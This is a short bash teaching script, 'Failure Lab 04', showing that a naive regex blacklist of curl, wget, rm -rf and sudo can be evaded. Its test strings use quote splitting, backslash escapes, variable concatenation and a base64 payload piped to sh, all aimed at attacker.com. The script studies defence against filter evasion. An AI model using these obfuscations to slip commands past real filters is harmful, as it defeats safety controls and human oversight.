#!/usr/bin/env bash
# Failure Lab 04: Regex Evasion Demonstration
set -euo pipefail

NAIVE_REGEX='(curl|wget|rm[[:space:]]+-rf|sudo)'

test_command() {
    local cmd="$1"
    echo -n "Testing: '$cmd' -> "
    if echo "$cmd" | grep -Eq "$NAIVE_REGEX"; then
        echo "[BLOCKED BY REGEX]"
    else
        echo "[EVADED REGEX - EXECUTABLE!]"
    fi
}

echo "=== NAIVE REGEX BLACKLIST TEST ==="
test_command "curl http://attacker.com"               # Caught
test_command "c'u'r'l http://attacker.com"           # Evaded!
test_command "c\"\"url http://attacker.com"           # Evaded!
test_command "c\url http://attacker.com"              # Evaded!
test_command "CMD=cu; CMD2=rl; \$CMD\$CMD2 http://a"  # Evaded!
test_command "echo Y3VybAo= | base64 -d | sh"         # Evaded!
